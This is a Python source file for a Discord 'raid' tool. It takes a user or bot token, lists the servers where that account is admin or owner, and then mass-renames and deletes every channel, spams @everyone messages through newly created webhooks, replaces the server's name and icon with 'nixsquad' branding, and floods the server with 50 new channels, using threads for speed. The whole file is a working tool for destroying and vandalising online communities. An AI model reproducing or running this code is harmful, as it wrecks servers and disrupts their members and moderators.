import requests
from time import sleep, strftime
from colorama import init, Fore
import concurrent.futures

import discord

init()

token_input = None
is_user_token = None
hour = strftime("%H:%M:%S")

def take_action_menu() -> None:
    if is_user_token is not None:
        admin_guilds, owner_guilds = get_token_guilds(token_input)
        print(f'{Fore.GREEN}⩥-----------------------------------------------------------------⩤{Fore.RESET}')
        print(f'''
                    {Fore.RED}Guilds with admin: {Fore.GREEN}{len(admin_guilds)}
                    {Fore.RED}Guilds with own: {Fore.GREEN}{len(owner_guilds)}
        ''')
        print(f'{Fore.GREEN}⩥-----------------------------------------------------------------⩤{Fore.RESET}')
        print(f'''
                    O P T I O N S:
                    {Fore.RED}1. view guilds info.
                    {Fore.RED}2. raid with  token.
                    {Fore.RED}0. exit     program.
        ''')
        print(f'{Fore.GREEN}⩥-----------------------------------------------------------------⩤{Fore.RESET}\n')
        action = input(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.GREEN}select option: ')
        
        if action == "1":
            print(f'{Fore.GREEN}⩥-----------------------------------------------------------------⩤{Fore.RESET}')
            for guild in admin_guilds:
                print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.GREEN}{guild["name"]}{Fore.BLACK}({Fore.RED}{guild["id"]}{Fore.BLACK}) {Fore.GREEN} -> {Fore.RED}{guild["approximate_member_count"]} members.')
            for guild in owner_guilds:
                print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.GREEN}{guild["name"]}{Fore.BLACK}({Fore.RED}{guild["id"]}{Fore.BLACK}) {Fore.GREEN} -> {Fore.RED}{guild["approximate_member_count"]} members.')
            print(f'{Fore.GREEN}⩥-----------------------------------------------------------------⩤{Fore.RESET}\n')
            take_action_menu()
        if action == "2":
            server_id = input(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.GREEN}set server id: ')
            raid_server_action(server_id)

def raid_server_action(server_id: str) -> None:
    guild = get_server_info(token_input, server_id)
    headers = {
        'Authorization': f'{"Bot " if not is_user_token else ""}{token_input}',
        'Content-Type': 'application/json'
    }
    print(f'{Fore.GREEN}⩥-----------------------------------------------------------------⩤{Fore.RESET}')
    print(f'''
                    {Fore.GREEN}Stablished conection with 
                    {Fore.GREEN}{guild["name"]}{Fore.BLACK}({Fore.RED}{guild["id"]}{Fore.BLACK}) 
                    {Fore.GREEN}successfully!
                    
                    {Fore.GREEN}Select Option:

                    {Fore.RED}1. change all channels    name.
                    {Fore.RED}2. delete all server  channels.
                    {Fore.RED}3. spam channels with webhooks.
                    {Fore.RED}4. change server    appearance.
                    {Fore.RED}5. make       new     channels.
                    {Fore.RED}0. exit     the        program.
    ''')
    action = input(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.GREEN}select option: ')

    if action == "1":
        url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
        channels_req = requests.get(url, headers=headers)
        if channels_req.status_code == 200:
            channels = channels_req.json()

            def edit_channel_names(channel):
                try:
                    url = f'https://discord.com/api/v9/channels/{channel["id"]}'
                    requests.patch(url, headers=headers, json={
                        "name": "𝔟𝔶𝔭𝔞𝔰𝔰𝔢𝔡-𝔟𝔶-𝔫𝔦𝔵𝔰𝔮𝔲𝔞𝔡"
                    })
                    print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.WHITE}-> action taked on channel {channel["id"]}')
                    sleep(0.3)
                except Exception as e:
                    print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.WHITE}-> {e}')

            with concurrent.futures.ThreadPoolExecutor() as executor:
                futures = [executor.submit(edit_channel_names, channel) for channel in channels]

                concurrent.futures.wait(futures)

            raid_server_action(server_id)
        else:
            print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.WHITE}-> {channels_req.status_code}')
            raid_server_action(server_id)

    if action == "2":
        url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
        channels_req = requests.get(url, headers=headers)
        if channels_req.status_code == 200:
            channels = channels_req.json()
            def eliminar_canal(channel):
                try:
                    url_delete = f'https://discord.com/api/v9/channels/{channel["id"]}'
                    channel_delete = requests.delete(url_delete, headers=headers)
                    if channel_delete.status_code == 200:
                        print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.WHITE}-> deleted channel {channel["id"]}')
                        sleep(0.2)
                except Exception as e:
                    print(f'Error al eliminar canal {channel["id"]}: {e}')

            with concurrent.futures.ThreadPoolExecutor() as executor:
                executor.map(eliminar_canal, channels)
        else:
            print(f'Error al obtener la lista de canales: {channels_req.status_code}')
        raid_server_action(server_id)

    if action == "3":
        webhooks = []
        url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
        channels_req = requests.get(url, headers=headers)
        if channels_req.status_code == 200:
            channels = channels_req.json()
            for channel in channels:
                try:
                    url_wb = f'https://discord.com/api/v9/channels/{channel["id"]}/webhooks'
                    webhook = requests.post(url_wb, headers=headers, json={
                        "name": "bypassed-by-nixsquad"
                    }).json()
                    print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.WHITE}-> created webhook on channel {channel["id"]} ')
                    webhooks.append(webhook['url'])
                    sleep(.2)
                except:
                    pass
            
            with concurrent.futures.ThreadPoolExecutor() as executor:
                for webhook in webhooks:
                    executor.map(
                        lambda _: requests.post(webhook, json={
                            'content': '@everyone https://discord.gg/nixakanazis han sido domados por la nixsquad.'
                            }
                        ),
                        range(5)
                    )
                    sleep(0.1)
        raid_server_action(server_id)

    if action == "4":    
        url = f'https://discord.com/api/v9/guilds/{server_id}'
        payload={
            "name": "𝔟𝔶𝔭𝔞𝔰𝔰𝔢𝔡-𝔟𝔶-𝔫𝔦𝔵𝔰𝔮𝔲𝔞𝔡",
            "icon": "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASIAAAE4CAYAAAD/8/5LAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAA1wSURBVHhe7d2LldrIFgVQx0VAxEM0JEMwM6UfdEtHRnz6Qptdb+1ZvGMkBFYduwS0/7TxH8CLxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDPlIu97+eOpN47j/08vbwFPEkI+kiHiZGPKBdodTbz5uL6Kh0A6tzDrTOB12vbwNHy6GfCBFxAvFkHeya5O32bXbnXifh4zF0TrjWw+dDr3tj7vvHdumnfm4vdD4IDHknSgi/n0x5A3MLxrfXgwb7Q697pG+9tCtxbHbH3uXMezx2JZjnbQNjGLIG1BEfJAY8korxdBaoRe3eUDXHd/644ceB/4ihrySIuLzxJAXWnsb/ekFsSi84dZh96cXt4GfEUNeSBHxgWLIS3Qls/7297OLaL4k84FDXiiGvIQi4mPFkBdYXZJN41lv3y+WZEP17duvdeI28LNiyAsoIj5YDCk1X5KNxdDWTZ3LeE5hWJLxhmJIKUXEx4shheZLsnMxLJZQw7j1qxdn8/3du9TbteJsum+f9N9AefJF9Mn0lZHz8d76OG3bzrT96bDvxfvyajGkkCLKFNFHiSEluknxZUm2KIZuubT88Rznovq2r+vanPy2JLu90GbHO07x538Acv44w9j8vFcK/OYio1IMKaGIMkX0gWJIga3FML9fV1adS2FdMZ+Yt24/evg4tlopkuvFuVJgrXw6dx/neSl66D36ZgFRDCkwn9iKaKSIPlEM+Um3FkOb/Z3LGLbcuiSaF8j1CT2XJ/jt+/m76eL08TjYXEQrxXXvEvasHctwsXv43/OXoHwRQ36SIooU0UeLIT+oK4XONK5P6JUlx7WJdmvhrZh/vODe/Sx1x777b9/23bnst/uHAsIP82/Lq860/VRc3V2Guw23Hi2My/N9zv7YJIb8IEU0UUScxZCf0CbNtyXWjRO62/Tr5kMtpa98DBN8PpGvF97cs/YzM178Pe935XVYFOA4Tqe2UGrO49Reh2bfyqLz7bE2GQvxOP5jBQ/vjzvEkJ+giAaKiKUY8lRPmtDzIhvHYj/z+91YeGfzpd1q8W0zX0pNb6un+w7ykvQ8ju15NTc/r8lYiF33dO5+nXiGGPJUiqijiPiLGPJEiyXG3Sd8LrTL/vJF3psLb/T4cY/H22Z5p23cO+53vbxNZ9juvFRaHWMx3riEWivE238/eKIY8kSKSBFxVQx5iry0uLcYJouCGMfyIu69hTdoc7V3Hm2ydtJ9B0OBzCd6m+W9q4UxXyqN49SWX53z2/yLMTzSWsHt9u01aC77/fv9eYkY8hSKaJj3ioirYsgTLCbyg8VwkQtuPh4tvOvHPxTP/tBKphmmd3/H3vHQjrG59nwXxTWO1WJZKeJr41xo1wqRV4ghT3B9It9LESmif04MecTibe9hXP1KxmZDAXRzMc/HoaLufZt9cuuEv3WiL/ff3e6WTNsKdLnkmsawn8vxtLJs0j54GzHkEYpIEXGrGPKAtQn27C9PLpZO07h6UXmrsfDaLB/efv8+bi2es3bQmz6YySeJIQ9QRFcoIpZiyAMuBfEzBXQxFcVhsG+3w8Xd9zEeb3tZvvX004qTXyyGPEARrVFErIoh/IChiM5FPX3Qsf3aIxfV+SfEEH6AImJVDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMeaXdvnc4HHun06m3Nk6HXS/uC36HGPJKiojPE0MqTIVzPPXuHqdDb9f22YmPBe8thlRQRDCJIT9gt29l0XSdk3unC0//HQ/73n6361320d1uWdu4c77//k/v62PBLxNDfoAiglUx5AmuFc/peOjtd396aR/wIWLIEygi2CyG3GVYOq1dfFY8sCqG3EURwZ1iyA2mJVhXPd/q53TsKR64KobcQBHBw2LIBrvDqTcfp8O+5wOG/4juIxTdRynacrsz/wNnWnL7/X5IDNlAEX0IRVQhhkTjxeh2Fn7vn+HUPLTlVydv+w6G49/tj73ue7Txu7RP/8rI7CL+238lZTje/aEtq7svHXcvyfDKrIzhHu//+//WYkikiO6jiLgqhnyz73VzqHMe08Xodp9O3vb1zsXTHfJw5FfGcyfWfAl79ceWjF8GXrze/7XXu/mxCb/2uGNxnt902B163V36u719sf4KMeQbRfQIRcQGMaQ3FlA71zrn8e4n3jihurn/Zf63Yx6Ls7vw2l2Ane7fSqpzHs96fvMJO76Sa8U9L6y18fQv+S6OcxirhTl7vXzp+CliSE8RKSJFVCSGH+63FtB8Qg23jvtdL27TdHPqaw89PrG6x1pe1F/ud7jf5fGH4z20Y+1s38+d2oN+K+Dz67W2/9nxvPv58LvE8MMposcm+tYCGe53efzheBXRR4rhh8on/s+fcPMJOYzVpcHcSgFdv6g7K9wnPc/FEuu4713uM5/Q7dH7JeN4MXjtfpuf198tl4Ab9zsrrs2/P2wRww81P/HHoYhuooi4Qww/0t0n6MPuXAreXUCDS/E953lOHxO4jPl+x+fZ4v7t8avFN39dhltrF7uvuTzf72Pr875s/5zXi29i+JEU0WPPUxHxgBh+lsWEHsdiSfFs86XHNK5NuPkEvXFitNn0dYlxvRBWTB8TaK3Sf3VjPqbXb/76bn28+Xa3/n6Mx3cuvtnYfNF7/nrdehxsEcPPMj/hp/HjJ5wiUkSMYvhRunPs63k2nPY/+Ffv1Qly7XFzcd06oYZH+TI2T6zh8RdfBh2LZf58Tsd2n053uw9uLLzxeKdx/eLwyvHNxtaLzMul5jA2v97cIoYfpTvXvp9vwymsiOYUUTcU0Y+I4WeY/9V/Gpsn5lbDBJlO7LUJcu0EX1xM33ic1x637aS3ePu8+xpI93WQ1i7ffyDYcOv8Qcm113EatxbQaPF8F/uZva7trl9/rMmp/Z/OZYzPs20bl7zjHxDTUvM0aVv1e7nzebBJDD+DIhqHIuopoleK4WdoJ+/Xv/qfx8NFNEyQa0uE87j6eN2vfb04fduEGh79UhyLCb5xnNoxdhYTceV1XL3/Vmu/P2tj9sHIbtNvm7dj+fY6z1+ncfvpKybz7a/9QcFDYvgZ2lkWT/T5CXszRdQNRcQNYvgZriwppokbt+1MS5f9oXdsy4DOYnRZv0wYbp7H1r/qz49zvt2ieMYx3m+amJd9jkXZ7ttZjPFAj4dWfhv+EYBLsQ2Oh/a6bbgYfN1QwN2uU29OP7R++fyG7boO+dpDyzEd7/x5zrcfbq0WP88Qw8+giBRRf7yK6A3E8KNcJtJzxnKC5Imx+a/6bX2wbYkyTqxrBfrPG4p2XmCntuzqTEuvtYKdnw9b3+7nITH8KIroX6OIfqEYfqbZEmeY1mGMS5epcKYTO+6zWRTd/KLpVWORtV18XUnNJ1belu3mBTb80WFJViKGn0kRfThF9EIx5BkWF8OHWz/21REeM1sCW5KViiHPoIh+F0X0SjHkCRZLMkX0pizJ3kAMeQJF9FsoojcQQ57gUkSD533Qj870FZpHi33+B8bmj1XwTDHkCRTRz1JE/5QYwtvrriv315ZP7T/NzUup+ZsJN3+sgieKIbw9RfRPiSG8v3mRjLemr7gsv8IxXJSelnTn7eZfIuYVYgjvTxH9S2IIv8b0o2JvHgroncQQfg1F9E+IIfw+45eWr/2AumnpFvfBq8QQfh9F9JvFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBKsUQoFIMASrFEKBSDAEqxRCgUgwBivz573/AonXj4BCABwAAAABJRU5ErkJggg=="
        }
        sv_change = requests.patch(url, headers=headers, json=payload)
        if sv_change.status_code == 200:
            print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.WHITE}-> changed appearance of server {server_id} ')
            raid_server_action(server_id)
        else:
            print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.RED}-> i could not change appearance of server {server_id} ')
            raid_server_action(server_id)

    if action == "5":
        url = f'https://discord.com/api/v9/guilds/{server_id}/channels'
        
        for x in range(50):
            try:
                request = requests.post(url, headers=headers, json={
                    'name': '𝔟𝔶𝔭𝔞𝔰𝔰𝔢𝔡-𝔟𝔶-𝔫𝔦𝔵𝔰𝔮𝔲𝔞𝔡',
                    'parent_id': None,
                    'type': 0
                })
                print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.WHITE}-> created channel {x}')
            except:
                print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.RED}-> i could not create channel {x}')
                pass

        raid_server_action(server_id)


def get_server_info(token: str, guild_id: int) -> dict:
    headers = {
        'Authorization': f'{"Bot " if not is_user_token else ""}{token}',
        'Content-Type': 'application/json'
    }

    url = f'https://discord.com/api/v9/guilds/{guild_id}'

    guild_info = requests.get(url, headers=headers)
    if guild_info.status_code != 404:
        guild = guild_info.json()
        return guild
    else:
        return None
        

def init_panel() -> None:
    global hour
    from getpass import getpass
    token = getpass(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.GREEN}enter the [user/bot] token: ')
    is_valid_token = check_token(token)
    if bool(is_valid_token) is not False:
        global token_input
        token_input = token
        print(f'{Fore.BLACK}[{Fore.RED}{hour}{Fore.BLACK}] {Fore.GREEN}{"(Bot token detected) selected headers" if not is_user_token else "(User token detected) selected headers"}')
        print(f'{Fore.GREEN}⩥-----------------------------------------------------------------⩤ ')
        info = get_token_info(token)
        print(f'''
                    {Fore.RED}Username: {Fore.GREEN}{info['username']}  
                    {Fore.RED}ID: {Fore.GREEN}{info['id']}
                    {Fore.RED}Type: {Fore.GREEN}{"Bot" if not is_user_token else "User"}
        ''')
        print(f'{Fore.GREEN}⩥-----------------------------------------------------------------⩤\n')
        take_action_menu()

def get_token_info(token: str) -> dict:
    headers = {
        'Authorization': f'{"Bot " if not is_user_token else ""}{token}',
        'Content-Type': 'application/json'
    }
    try:
        if is_user_token is not True:
            info_respose = requests.get('https://discord.com/api/v9/oauth2/applications/@me', headers=headers).json()
            bot_info = info_respose['bot']
            return bot_info
        else:
            user_info = requests.get('https://discord.com/api/v9/users/@me', headers=headers).json()
            return user_info
    except:
        return None
    
def get_token_guilds(token: str) -> dict:
    headers = {
        'Authorization': f'{"Bot " if not is_user_token else ""}{token}',
        'Content-Type': 'application/json'
    }

    url = 'https://discord.com/api/v9/users/@me/guilds?with_counts=true'

    response = requests.get(url, headers=headers)

    if response.status_code != 401:
        guilds = response.json()
        admin_guilds = [guild for guild in guilds if discord.Permissions(int(guild['permissions'])).administrator is not False]
        owner_guilds = [guild for guild in guilds if True == bool(guild['owner'])]

        return admin_guilds, owner_guilds
    else:
        return None, None

def check_token(token: str) -> bool:
    global is_user_token

    headers = {
        'Authorization': token,
        'Content-Type': 'application/json'
    }

    headers_for_bot = {
        'Authorization': f'Bot {token}',
        'Content-Type': 'application/json'
    }

    try:
        user_info_response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
        bot_info_response = requests.get('https://discord.com/api/v9/oauth2/applications/@me', headers=headers_for_bot)

        if user_info_response.status_code == 200:
            is_user_token = True
            return True
        elif bot_info_response.status_code == 200:
            is_user_token = False
            return True
        else:
            return False
    except Exception as e:
        print(f"Error: {e}")
        return False
    